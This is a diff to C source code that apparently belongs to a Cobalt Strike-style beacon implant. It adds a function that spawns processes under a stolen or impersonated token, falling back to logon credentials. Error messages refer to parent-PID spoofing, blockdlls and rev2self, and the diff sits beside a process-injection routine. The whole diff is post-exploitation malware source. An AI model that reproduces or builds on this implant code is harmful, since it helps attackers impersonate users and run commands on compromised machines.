@@ -1027,6 +1027,61 @@ BOOL SpawnProcessWithLogon(RUN_UNDER_CONFIG* runUnderConfig, WCHAR* cmd, const W
 	return TRUE;
 }
 
+BOOL  SpawnProcessWithTokenOrLogon(RUN_UNDER_CONFIG* runUnderConfig)
+{
+	int type;
+	WCHAR cmd[1024] = { 0 };
+	WCHAR buffer[1024] = { 0 };
+
+	runUnderConfig->startupInfo->lpDesktop = 0;
+	const WCHAR* lpCurrentDirectory = NULL;
+	if (toWideChar(runUnderConfig->cmd, cmd, sizeof(cmd)/sizeof(WCHAR)))
+	{
+		if (GetCurrentDirectoryW(0, 0) < sizeof(cmd) / sizeof(WCHAR))
+		{
+			GetCurrentDirectoryW(sizeof(cmd) / sizeof(WCHAR), buffer);
+			lpCurrentDirectory = buffer;
+		}
+		if (CreateProcessWithTokenW(
+			gIdentityToken,
+			LOGON_NETCREDENTIALS_ONLY,
+			NULL,
+			cmd,
+			runUnderConfig->creationFlags,
+			NULL,
+			lpCurrentDirectory,
+			runUnderConfig->startupInfo,
+			runUnderConfig->processInfo))
+		{
+			return TRUE;
+		}
+
+		DWORD lastError = GetLastError();
+		if (lastError == ERROR_PRIVILEGE_NOT_HELD
+			&& CreateProcessWithLogonW && gIdentityIsLoggedIn == TRUE)
+			return SpawnProcessWithLogon(runUnderConfig, cmd, lpCurrentDirectory);
+
+		if (lastError == ERROR_INVALID_PARAMETER
+			&& runUnderConfig->startupInfo->cb == sizeof(STARTUPINFOEXA) && CreateProcessWithLogonW)
+		{
+			LERROR("Could not spawn %s (token) with extended startup information. Reset ppid, disable blockdlls, or rev2self to drop your token.", runUnderConfig->cmd);
+			type = ERROR_SPAWN_TOKEN_EXTENDED_STARTUPINFO;
+		}
+		else
+		{
+			LERROR("Could not spawn %s (token): %s", runUnderConfig->cmd, LAST_ERROR_STR(lastError));
+			type = ERROR_SPAWN_PROCESS_AS_USER_FAILED;
+		}
+		BeaconErrorDS(type, lastError, runUnderConfig->cmd);
+	}
+	else
+	{
+		LERROR("Could not run command(w / token) because of its length of %d", runUnderConfig->cmdLength);
+		BeaconErrorD(ERROR_LENGTHY_WIDECHAR_COMMAND, runUnderConfig->cmdLength);
+	}
+	return FALSE;
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
